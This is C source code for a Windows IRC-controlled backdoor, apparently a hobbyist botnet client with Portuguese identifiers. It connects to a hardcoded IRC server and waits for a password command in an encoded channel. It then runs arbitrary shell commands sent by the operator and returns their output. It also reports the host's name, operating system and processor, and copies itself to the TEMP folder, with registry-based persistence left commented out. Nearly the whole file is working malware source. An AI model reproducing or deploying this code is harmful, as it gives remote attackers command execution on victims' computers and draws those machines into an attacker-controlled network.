#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <unistd.h>
#include <winsock.h>
#include <conio.h>
#include <windows.h>
//===========================================
#define SERVER "193.10.255.100"
#define PORTA 6667
#define CANAL "#Z29uNGZsb3c"
#define SENHA "123456"
#define MAX 4096

//number = rand() % 10 + 1;

void startup(char *arg){
	//unsigned long type = REG_SZ;
	char *data;
	sprintf(data, "%swincpp.exe", getenv("TEMP"));
	FILE *fo = fopen("C:\\Windows\\System32\\acesspoint.dll", "r");
	if(!fo){
		//FILE *fl = fopen("C:\\Windows\\System32\\acesspoint.dll", "w");
		//fclose(fl);
		CopyFile(arg, data, 0);
		//system("start C:\\Windows\\System32\\wincpp.exe");
		fclose(fo);
		//HKEY Entrada;
		//if ((RegCreateKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 
		//			REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &Entrada, &type)) == ERROR_SUCCESS) {
		//		RegSetValueEx(Entrada, "File description", 0, REG_SZ, ((BYTE *)"C:\\Windows\\System32\\wincpp.exe"), ((unsigned long)30));
		//		RegCloseKey(Entrada);
			//}
		//RegCloseKey(Entrada);
		exit(0);
	}else{
		fclose(fo);
	}
}

char *str_replace(char *orig, char *rep, char *with) {
    char *result; 
    char *ins; 
    char *tmp;    
    int len_rep;  
    int len_with; 
    int len_front; 
    int count;    

    if (!orig)
        return NULL;
    if (!rep)
        rep = "";
    len_rep = strlen(rep);
    if (!with)
        with = "";
    len_with = strlen(with);

    ins = orig;
    for (count = 0; tmp = strstr(ins, rep); ++count) {
        ins = tmp + len_rep;
    }
    tmp = result = malloc(strlen(orig) + (len_with - len_rep) * count + 1);

    if (!result)
        return NULL;

    while (count--) {
        ins = strstr(orig, rep);
        len_front = ins - orig;
        tmp = strncpy(tmp, orig, len_front) + len_front;
        tmp = strcpy(tmp, with) + len_with;
        orig += len_front + len_rep;
    }
    strcpy(tmp, orig);
    return result;
}

char *
strsep(stringp, delim)
	char **stringp;
	const char *delim;
{
	char *s;
	const char *spanp;
	int c, sc;
	char *tok;

	if ((s = *stringp) == NULL)
		return (NULL);
	for (tok = s;;) {
		c = *s++;
		spanp = delim;
		do {
			if ((sc = *spanp++) == c) {
				if (c == 0)
					s = NULL;
				else
					s[-1] = 0;
				*stringp = s;
				return (tok);
			}
		} while (sc != 0);
	}
}

struct sockaddr_in remoto;

enum boolean {
    true = 1, false = 0
};

typedef  enum boolean  bool;
 

int main(int argc, char **argv){
	startup(argv[0]);
	SetConsoleTitle("wincpp");
	HWND wnd = FindWindow(0, "wincpp");
	char nick[1000 + 1];
	DWORD size = 1000+1;
	int sockfd; 
	int sv;
	int len = sizeof(remoto);
	int slen;
	char buffer_recv[MAX], suffix[512], buffer_send[MAX], tmp[1024], user[1024], cmd[1024], command[4026];
	char* split;
	char* ret;
	char *rete;
	char* string;
	FILE *in;
	GetComputerName(nick, &size);
		OSVERSIONINFO	vi;
	memset (&vi, 0, sizeof vi);
	vi .dwOSVersionInfoSize = sizeof vi;
	GetVersionEx (&vi);
   	SYSTEM_INFO siSysInfo;
   	GetSystemInfo(&siSysInfo); 
	char arquitetura[100], processador[100], os[1000];
	
	switch(vi.dwMajorVersion){
			case 5:
				if(vi.dwMinorVersion == 0){
					strcpy(os, "Windows 2000");
				}else if(vi.dwMinorVersion == 1){ strcpy(os, "Windows XP"); }
				break;			
			case 6:
				if(vi.dwMinorVersion == 0){
					strcpy(os, "Windows Vista");
					
				}else if(vi.dwMinorVersion == 1){
					strcpy(os, "Windows 7");
					
				}else if(vi.dwMinorVersion == 2){
					strcpy(os, "Windows 8");	
						
				}else if(vi.dwMinorVersion == 3){
					strcpy(os, "Windows 8.1");
					
				}
				break;	
			case 10:
				strcpy(os, "Windows 10");
				
				break;
		}
	
	switch(siSysInfo.wProcessorArchitecture){
		case 9:
			strcpy(arquitetura, "x64 (AMD or Intel)");
			break;
		case 6:
			strcpy(arquitetura, "Intel Itanium-based");
			break;
		case 5:
			strcpy(arquitetura, "ARM");
			break;
		case 0:
			strcpy(arquitetura, "x86");
			break;
	}
	switch(siSysInfo.dwProcessorType){
		case 386:
			strcpy(processador ,"PROCESSOR_INTEL_386");
			break;
		case 486:
			strcpy(processador, "PROCESSOR_INTEL_486");
			break;
		case 586:
			strcpy(processador, "PROCESSOR_INTEL_PENTIUM");
			break;
		case 2200:
			strcpy(processador, "PROCESSOR_INTEL_IA64");
			break;
		case 8664:
			strcpy(processador, "PROCESSOR_AMD_X8664");
			break;	
}
	
	WORD wsaVersion;
  	wsaVersion = MAKEWORD(2, 0);
  	WSADATA wsaData;

  	WSAStartup(wsaVersion, &wsaData);

	sockfd = socket(AF_INET, SOCK_STREAM, 0);

	remoto.sin_family		= AF_INET; 
	remoto.sin_port			= htons(PORTA); 
	remoto.sin_addr.s_addr 	= inet_addr(SERVER);

	memset(remoto.sin_zero, 0x0, 8);

	if((sv = connect(sockfd,(struct sockaddr*)&remoto, len)) == -1){
		perror("connect ");
		exit(1);
	}

	memset(buffer_send, 0, sizeof(buffer_send));
  	sprintf(buffer_send, "NICK %s\r\n", nick);
  	send(sockfd, buffer_send, strlen(buffer_send), 0);
  	memset(buffer_send, 0, sizeof(buffer_send));
  	sprintf(buffer_send, "USER %s \"\" \"\" :%s\r\n", nick, nick);
  	send(sockfd, buffer_send, strlen(buffer_send), 0);
  	memset(buffer_send, 0, sizeof(buffer_send));
  	sprintf(buffer_send, "JOIN %s \r\n", CANAL);
  	send(sockfd, buffer_send, strlen(buffer_send), 0);
  	usleep(2000000);

	bool login = false;

	while(login == false){
		if((slen = recv(sockfd, buffer_recv, MAX, 0)) > 0){
			if(sscanf(buffer_recv, "PING :%s", suffix) > 0){
				sprintf(buffer_recv, "PONG :%s\r\n", suffix);
				send(sockfd, buffer_recv, strlen(buffer_recv), 0);
				memset(buffer_recv, 0x0 ,sizeof(buffer_recv));

			}else if(strstr(buffer_recv, "Nickname is already in use")){
				int number = rand() % 10 + 1;
				sprintf(nick, "%d", number);
					memset(buffer_send, 0, sizeof(buffer_send));
				  	sprintf(buffer_send, "NICK %s\r\n", nick);
				  	send(sockfd, buffer_send, strlen(buffer_send), 0);
				  	memset(buffer_send, 0, sizeof(buffer_send));
				  	sprintf(buffer_send, "USER %s \"\" \"\" :%s\r\n", nick, nick);
				  	send(sockfd, buffer_send, strlen(buffer_send), 0);
				  	memset(buffer_send, 0, sizeof(buffer_send));
				  	sprintf(buffer_send, "JOIN %s \r\n", CANAL);
				  	send(sockfd, buffer_send, strlen(buffer_send), 0);
			}else{
				if(buffer_recv != NULL){
					printf("\n Não NULL\n");
					if(strstr(buffer_recv, "$ligar 123456") != NULL){
						printf("\n entro acho a logar\n");
						sprintf(buffer_send, "PRIVMSG %s :[+] Ligado com sucesso \r\n", CANAL);
						printf("\n strcpy sucefull\n");
						send(sockfd, buffer_send, strlen(buffer_send), 0);
						printf("\n send sucefull\n");
						memset(buffer_recv, 0x0, sizeof(buffer_recv));
						memset(buffer_send, 0x0, sizeof(buffer_send));
						break;
				}
				}
				printf("%s\n", buffer_recv);
				memset(buffer_recv, 0x0, sizeof(buffer_recv));
				printf("limpou\n");
				
			}
			
			
		}

	}

	while(true){
		if((slen = recv(sockfd, buffer_recv, MAX, 0)) > 0){
			printf("\n slen maior que 0\n");
			if(sscanf(buffer_recv, "PING :%s", suffix) > 0){
				printf("\n Ã© ping\n");
				sprintf(buffer_recv, "PONG :%s\r\n", suffix);
				send(sockfd, buffer_recv, strlen(buffer_recv), 0);
				memset(buffer_send, 0x0 ,sizeof(buffer_recv));

			}else{
				printf("\n entro no else\n");
				string = buffer_recv;
				printf("\n string = buffer_recv\n");
				strsep(&string, "$");
				printf("\n strsep 3\n");
				if(string != NULL){
					printf("%s", string);
					printf("\n switch\n");
					switch(string[0]){
						case 'e':
							printf("\nentrou no case");
							strsep(&string, " ");
							printf("\nstrcpy and strsep");
							ret = strsep(&string, " ");
							if(string != NULL){						
								printf("\nstrcpy and strsep 2");
								strcpy(user, ret);
								printf("\ncpy 3");
								printf("\nUSER: %s\n",nick);
								printf("USER: %s\n", user);
								if(strstr(user, nick) != NULL || strstr(user, "all")){
									strcpy(cmd, string);
									strcpy(cmd, str_replace(cmd, "\r\n", ""));
									printf("\ncpy 4");
									printf("%s", cmd);
									in = popen(cmd, "r");
									while(fgets(tmp, sizeof(tmp), in)!=NULL){
										strcpy(command, tmp);
										strcpy(command, str_replace(command , "\n", ""));
										sprintf(buffer_send, "PRIVMSG %s : %s \r\n", CANAL, command);
										printf("\n%s" ,buffer_send);
										send(sockfd, buffer_send, strlen(buffer_send), 0);
										memset(buffer_send, 0x0, sizeof(buffer_send));
										memset(command, 0x0, sizeof(command));
										memset(tmp, 0x0, sizeof(tmp));
										usleep(1000000);
									}
									pclose(in);
									printf("enviou com sucesso!");
								}
								memset(buffer_recv, 0x0, sizeof(buffer_recv));
								memset(buffer_send, 0x0, sizeof(buffer_send));
								memset(tmp, 0x0, sizeof(tmp));
								memset(command, 0x0, sizeof(command));
								memset(user, 0x0, sizeof(user));
								memset(cmd, 0x0, sizeof(cmd));
								memset(ret, 0x0, sizeof(ret));
								memset(string, 0x0, sizeof(string));
								break;
							}else{ break; }
											
						case 'o':
							sprintf(buffer_send, "PRIVMSG %s : [+] %s \r\n", CANAL, nick);
							send(sockfd, buffer_send, strlen(buffer_send), 0);
							memset(buffer_send, 0x0, sizeof(buffer_send));
							break;
						case 'i':
							strsep(&string, " ");
							if(strstr(string, nick)){
								sprintf(buffer_send, "PRIVMSG %s :******************************************** \r\n", CANAL);
								send(sockfd, buffer_send, strlen(buffer_send), 0);
								memset(buffer_send, 0x0, sizeof(buffer_send));
								sprintf(buffer_send, "PRIVMSG %s :*[+]Nome: %s \r\n", CANAL, nick);
								send(sockfd, buffer_send, strlen(buffer_send), 0);
								memset(buffer_send, 0x0, sizeof(buffer_send));
								sprintf(buffer_send, "PRIVMSG %s :*[+]Sistema Operacional: %s \r\n", CANAL, os);
								send(sockfd, buffer_send, strlen(buffer_send), 0);
								memset(buffer_send, 0x0, sizeof(buffer_send));
								sprintf(buffer_send, "PRIVMSG %s :*[+]Processador: %s \r\n", CANAL, processador);
								send(sockfd, buffer_send, strlen(buffer_send), 0);
								memset(buffer_send, 0x0, sizeof(buffer_send));
								sprintf(buffer_send, "PRIVMSG %s :*[+]Arquitetura: %s \r\n", CANAL, arquitetura);
								send(sockfd, buffer_send, strlen(buffer_send), 0);
								memset(buffer_send, 0x0, sizeof(buffer_send));
								sprintf(buffer_send, "PRIVMSG %s :******************************************** \r\n", CANAL, nick);
								send(sockfd, buffer_send, strlen(buffer_send), 0);
								memset(buffer_send, 0x0, sizeof(buffer_send));
							}
							memset(string, 0x0, sizeof(string));
						

					}
				}
			}
		}
	}
	return 0;
}
